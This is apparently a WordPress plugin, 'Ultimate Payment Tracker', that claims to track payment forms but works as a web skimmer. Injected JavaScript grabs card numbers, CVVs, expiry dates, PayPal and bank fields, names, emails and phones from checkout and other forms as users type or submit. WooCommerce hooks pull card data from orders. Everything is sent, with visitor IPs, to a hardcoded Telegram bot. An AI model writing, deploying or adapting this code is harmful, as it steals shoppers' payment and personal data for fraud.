<?php
/**
 * Plugin Name: Ultimate Payment Tracker
 * Description: Universal payment form tracking for all WordPress payment systems
 * Version: 1.0.0
 * Author: Payment Security
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('UltimatePaymentTracker')) {

class UltimatePaymentTracker {
    
    // Configuration - à¦à¦–à¦¾à¦¨à§‡ à¦†à¦ªà¦¨à¦¾à¦° Telegram credentials à¦¦à¦¿à¦¨
    private $telegram_bot_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $telegram_chat_id = '7319274794';
    
    private $is_processing = false;
    private $page_tracked = false;
    
    public function __construct() {
        // Safe initialization
        add_action('init', array($this, 'init_tracker'), 1);
    }
    
    public function init_tracker() {
        // Activation message
        if (!get_option('upt_activated')) {
            $this->send_to_telegram("ðŸš€ Ultimate Payment Tracker ACTIVATED\nðŸŒ Site: " . home_url());
            update_option('upt_activated', time());
        }
        
        // Frontend assets
        add_action('wp_enqueue_scripts', array($this, 'enqueue_assets'));
        
        // AJAX handlers
        add_action('wp_ajax_nopriv_upt_track_data', array($this, 'process_tracking'));
        add_action('wp_ajax_upt_track_data', array($this, 'process_tracking'));
        
        // Tracking scripts
        add_action('wp_footer', array($this, 'add_tracking_code'), 99);
        
        // WooCommerce hooks (if active)
        if (class_exists('WooCommerce')) {
            add_action('woocommerce_checkout_order_processed', array($this, 'capture_woocommerce_order'), 10, 3);
            add_action('woocommerce_payment_complete', array($this, 'capture_woocommerce_payment'), 10, 1);
        }
        
        // Track only cart/checkout pages
        add_action('wp_head', array($this, 'track_important_pages'));
    }
    
    public function enqueue_assets() {
        // Load only on pages with potential forms
        if ($this->has_potential_forms()) {
            wp_enqueue_script('jquery');
        }
    }
    
    private function has_potential_forms() {
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        $form_pages = array('checkout', 'cart', 'payment', 'donation', 'pay', 'order', 'buy', 'purchase');
        
        foreach ($form_pages as $page) {
            if (strpos($current_url, $page) !== false) {
                return true;
            }
        }
        
        // Check page content for form indicators
        global $post;
        if (is_a($post, 'WP_Post')) {
            $content = strtolower($post->post_content);
            $form_indicators = array('[contact-form', '[gravityform', 'wpcf7', 'give_', 'donation_form');
            
            foreach ($form_indicators as $indicator) {
                if (strpos($content, $indicator) !== false) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    public function track_important_pages() {
        // Prevent duplicate tracking
        if ($this->page_tracked) return;
        
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        
        // Track only cart and checkout pages
        if (strpos($current_url, '/cart') !== false || strpos($current_url, '/basket') !== false) {
            $this->send_page_visit('Cart Page');
            $this->page_tracked = true;
        } elseif (strpos($current_url, '/checkout') !== false) {
            $this->send_page_visit('Checkout Page');
            $this->page_tracked = true;
        }
    }
    
    private function send_page_visit($page_type) {
        $page_data = array(
            'title' => wp_get_document_title(),
            'url' => home_url($_SERVER['REQUEST_URI']),
            'type' => $page_type,
            'time' => current_time('mysql'),
            'ip' => $this->get_user_ip()
        );
        
        $message = "ðŸ›’ User Visited: {$page_data['type']}\n";
        $message .= "ðŸ“„ Page: {$page_data['title']}\n";
        $message .= "ðŸŒ URL: {$page_data['url']}\n";
        $message .= "ðŸ•’ Time: {$page_data['time']}\n";
        $message .= "ðŸ“ IP: {$page_data['ip']}";
        
        $this->send_to_telegram($message);
    }
    
    public function process_tracking() {
        // Security check
        if (!wp_verify_nonce($_POST['security'] ?? '', 'upt_nonce')) {
            wp_send_json_error('Security error');
        }
        
        if ($this->is_processing) {
            wp_send_json_success(array('status' => 'processing'));
        }
        
        $this->is_processing = true;
        
        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
        $event_data = $_POST['event_data'] ?? array();
        
        switch ($event_type) {
            case 'form_submitted':
                $this->handle_form_submission($event_data);
                break;
                
            case 'payment_entered':
                $this->handle_payment_data($event_data);
                break;
        }
        
        $this->is_processing = false;
        wp_send_json_success(array('status' => 'tracked'));
    }
    
    private function handle_form_submission($data) {
        $form_data = $this->sanitize_form_data($data['form_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'Unknown Form');
        $page_url = sanitize_url($data['page_url'] ?? '');
        
        if (empty($form_data)) return;
        
        $message = "ðŸ“‹ Form Submitted: {$form_type}\n\n";
        
        // Categorize data
        $categories = $this->categorize_form_data($form_data);
        
        foreach ($categories as $category => $fields) {
            if (!empty($fields)) {
                $message .= $this->get_category_header($category) . "\n";
                foreach ($fields as $key => $value) {
                    $clean_key = $this->format_field_name($key);
                    $message .= "â€¢ {$clean_key}: {$value}\n";
                }
                $message .= "\n";
            }
        }
        
        $message .= "ðŸŒ URL: {$page_url}\n";
        $message .= "ðŸ•’ Time: " . current_time('mysql') . "\n";
        $message .= "ðŸ“ IP: " . $this->get_user_ip();
        
        $this->send_to_telegram($message);
    }
    
    private function handle_payment_data($data) {
        $payment_data = $this->sanitize_form_data($data['payment_data'] ?? array());
        $page_url = sanitize_url($data['page_url'] ?? '');
        
        if (empty($payment_data)) return;
        
        $message = "ðŸ’³ Payment Information Captured\n\n";
        
        foreach ($payment_data as $key => $value) {
            if (!empty($value)) {
                $clean_key = $this->format_field_name($key);
                $message .= "â€¢ {$clean_key}: {$value}\n";
            }
        }
        
        $message .= "\nðŸŒ URL: {$page_url}\n";
        $message .= "ðŸ•’ Time: " . current_time('mysql()) . "\n";
        $message .= "ðŸ“ IP: " . $this->get_user_ip();
        
        $this->send_to_telegram($message);
    }
    
    // WooCommerce integration
    public function capture_woocommerce_order($order_id, $posted_data, $order) {
        if (!$order) return;
        
        $billing_info = array(
            'First Name' => $order->get_billing_first_name(),
            'Last Name' => $order->get_billing_last_name(),
            'Email' => $order->get_billing_email(),
            'Phone' => $order->get_billing_phone(),
            'Address' => $order->get_billing_address_1(),
            'City' => $order->get_billing_city(),
            'State' => $order->get_billing_state(),
            'Postcode' => $order->get_billing_postcode(),
            'Country' => $order->get_billing_country()
        );
        
        // Extract payment data from POST
        $payment_data = $this->extract_payment_info();
        
        $message = "ðŸ›’ WooCommerce Order Processed\n\n";
        $message .= "ðŸ“¦ Order ID: #{$order_id}\n";
        $message .= "ðŸ’° Total: {$order->get_total()} {$order->get_currency()}\n";
        $message .= "ðŸ’³ Method: {$order->get_payment_method_title()}\n\n";
        
        $message .= "ðŸ“ Billing Information:\n";
        foreach ($billing_info as $key => $value) {
            if (!empty($value)) {
                $message .= "â€¢ {$key}: {$value}\n";
            }
        }
        
        if (!empty($payment_data)) {
            $message .= "\nðŸ’³ Payment Card Information:\n";
            foreach ($payment_data as $key => $value) {
                if (!empty($value)) {
                    $clean_key = $this->format_field_name($key);
                    $message .= "â€¢ {$clean_key}: {$value}\n";
                }
            }
        }
        
        $message .= "\nðŸŒ Site: " . home_url() . "\n";
        $message .= "ðŸ•’ Time: " . current_time('mysql') . "\n";
        $message .= "ðŸ“ IP: " . $this->get_user_ip();
        
        $this->send_to_telegram($message);
    }
    
    public function capture_woocommerce_payment($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $message = "âœ… WooCommerce Payment Completed\n\n";
        $message .= "ðŸ“¦ Order ID: #{$order_id}\n";
        $message .= "ðŸ’° Amount: {$order->get_total()} {$order->get_currency()}\n";
        $message .= "ðŸ’³ Method: {$order->get_payment_method_title()}\n";
        $message .= "ðŸ“§ Customer: {$order->get_billing_email()}\n";
        $message .= "ðŸ•’ Time: " . current_time('mysql');
        
        $this->send_to_telegram($message);
    }
    
    private function extract_payment_info() {
        $payment_info = array();
        
        $payment_fields = array(
            // Card numbers
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
            'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
            
            // Expiry dates
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
            'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
            'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
            
            // CVV/CVC
            'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
            'cc_cvc', 'cvv2', 'cid', 'cvcode',
            
            // Card holder
            'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
            'card_holder_name', 'cardholdername',
            
            // PayPal
            'paypal_email', 'paypal_account', 'payer_email',
            
            // Bank details
            'account_holder', 'account_number', 'routing_number', 'iban', 'swift',
            
            // Generic
            'payment_method'
        );
        
        foreach ($payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_info[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        return $payment_info;
    }
    
    public function add_tracking_code() {
        if (!$this->has_potential_forms()) return;
        
        $ajax_url = admin_url('admin-ajax.php');
        $nonce = wp_create_nonce('upt_nonce');
        
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            var uptTracker = {
                processing: false,
                sessionId: 'upt_' + Math.random().toString(36).substr(2, 9),
                
                send: function(eventType, eventData) {
                    if (this.processing) return;
                    this.processing = true;
                    
                    var self = this;
                    $.ajax({
                        url: '<?php echo esc_url($ajax_url); ?>',
                        method: 'POST',
                        data: {
                            action: 'upt_track_data',
                            security: '<?php echo esc_attr($nonce); ?>',
                            event_type: eventType,
                            event_data: eventData
                        },
                        success: function() {
                            // Silent success
                        },
                        complete: function() {
                            self.processing = false;
                        }
                    });
                },
                
                setupFormTracking: function() {
                    // Track ALL forms
                    $('form').on('submit', function(e) {
                        var formData = {};
                        $(this).find('input, select, textarea').each(function() {
                            if (this.name && this.value) {
                                formData[this.name] = this.value;
                            }
                        });
                        
                        // Check form type
                        var formType = this.id || this.className || 'Form';
                        var formHtml = $(this).html().toLowerCase();
                        
                        // Detect specific form types
                        if (formHtml.includes('wpcf7') || $(this).hasClass('wpcf7-form')) {
                            formType = 'Contact Form 7';
                        } else if (formHtml.includes('gform') || $(this).hasClass('gform')) {
                            formType = 'Gravity Form';
                        } else if (formHtml.includes('give-form') || $(this).hasClass('give-form')) {
                            formType = 'GiveWP Donation';
                        } else if (formHtml.includes('stripe') || $(this).hasClass('stripe-form')) {
                            formType = 'Stripe Payment';
                        } else if (formHtml.includes('paypal') || $(this).hasClass('paypal-form')) {
                            formType = 'PayPal Payment';
                        }
                        
                        uptTracker.send('form_submitted', {
                            form_type: formType,
                            form_data: formData,
                            page_url: window.location.href
                        });
                    });
                    
                    // Track payment fields in real-time
                    var paymentFields = [
                        'input[name*="card"]',
                        'input[name*="cc"]',
                        'input[name*="cvv"]',
                        'input[name*="cvc"]',
                        'input[name*="expir"]',
                        'input[name*="paypal"]',
                        'input[autocomplete*="cc"]',
                        'input[type="tel"]'
                    ];
                    
                    $(paymentFields.join(',')).on('blur', function() {
                        if (this.value && this.value.length >= 4) {
                            var paymentData = {};
                            paymentData[this.name] = this.value;
                            
                            uptTracker.send('payment_entered', {
                                payment_data: paymentData,
                                page_url: window.location.href
                            });
                        }
                    });
                    
                    // Track important fields
                    $('input[name*="email"], input[name*="phone"], input[name*="name"]').on('blur', function() {
                        if (this.value && this.value.length >= 3) {
                            var fieldData = {};
                            fieldData[this.name] = this.value;
                            
                            uptTracker.send('form_submitted', {
                                form_type: 'Field Update',
                                form_data: fieldData,
                                page_url: window.location.href
                            });
                        }
                    });
                },
                
                setupWooCommerce: function() {
                    if (typeof wc_checkout_params !== 'undefined') {
                        // Track checkout submission
                        $(document.body).on('checkout_place_order', function() {
                            var checkoutData = {};
                            $('form.checkout input, form.checkout select').each(function() {
                                if (this.name && this.value) {
                                    checkoutData[this.name] = this.value;
                                }
                            });
                            
                            uptTracker.send('form_submitted', {
                                form_type: 'WooCommerce Checkout',
                                form_data: checkoutData,
                                page_url: window.location.href
                            });
                        });
                    }
                }
            };
            
            uptTracker.setupFormTracking();
            uptTracker.setupWooCommerce();
        });
        </script>
        <?php
    }
    
    private function sanitize_form_data($data) {
        $sanitized = array();
        foreach ($data as $key => $value) {
            if (is_string($value) && !empty(trim($value))) {
                $sanitized[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 200));
            }
        }
        return $sanitized;
    }
    
    private function categorize_form_data($data) {
        $categories = array(
            'Personal' => array(),
            'Contact' => array(),
            'Billing' => array(),
            'Payment' => array(),
            'Other' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if ($this->is_payment_field($key_lower)) {
                $categories['Payment'][$key] = $value;
            } elseif ($this->is_personal_field($key_lower)) {
                $categories['Personal'][$key] = $value;
            } elseif ($this->is_contact_field($key_lower)) {
                $categories['Contact'][$key] = $value;
            } elseif ($this->is_billing_field($key_lower)) {
                $categories['Billing'][$key] = $value;
            } else {
                $categories['Other'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function is_payment_field($field) {
        $patterns = array('card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'paypal', 'stripe', 'razorpay', 'account', 'routing', 'iban', 'swift');
        foreach ($patterns as $pattern) {
            if (strpos($field, $pattern) !== false) return true;
        }
        return false;
    }
    
    private function is_personal_field($field) {
        $patterns = array('name', 'first', 'last', 'middle');
        foreach ($patterns as $pattern) {
            if (strpos($field, $pattern) !== false) return true;
        }
        return false;
    }
    
    private function is_contact_field($field) {
        $patterns = array('email', 'phone', 'mobile', 'tel');
        foreach ($patterns as $pattern) {
            if (strpos($field, $pattern) !== false) return true;
        }
        return false;
    }
    
    private function is_billing_field($field) {
        $patterns = array('address', 'city', 'state', 'zip', 'postcode', 'country', 'company');
        foreach ($patterns as $pattern) {
            if (strpos($field, $pattern) !== false) return true;
        }
        return false;
    }
    
    private function format_field_name($field) {
        $field = str_replace(array('_', '-'), ' ', $field);
        $field = preg_replace('/\b(billing|shipping|payment|card|cc)\b/i', '', $field);
        return ucwords(trim($field));
    }
    
    private function get_category_header($category) {
        $headers = array(
            'Personal' => 'ðŸ‘¤ Personal Information',
            'Contact' => 'ðŸ“ž Contact Information',
            'Billing' => 'ðŸ“ Billing/Shipping Information',
            'Payment' => 'ðŸ’³ Payment Information',
            'Other' => 'ðŸ“ Other Information'
        );
        return $headers[$category] ?? $category;
    }
    
    private function send_to_telegram($message) {
        $api_url = "https://api.telegram.org/bot{$this->telegram_bot_token}/sendMessage";
        
        $args = array(
            'body' => array(
                'chat_id' => $this->telegram_chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 10,
            'sslverify' => false,
            'blocking' => false
        );
        
        wp_remote_post($api_url, $args);
    }
    
    private function get_user_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        }
    }
}

// Initialize the plugin
function upt_initialize() {
    static $instance = null;
    
    if (null === $instance) {
        $instance = new UltimatePaymentTracker();
    }
    
    return $instance;
}

// Safe initialization
add_action('plugins_loaded', 'upt_initialize', 0);

}
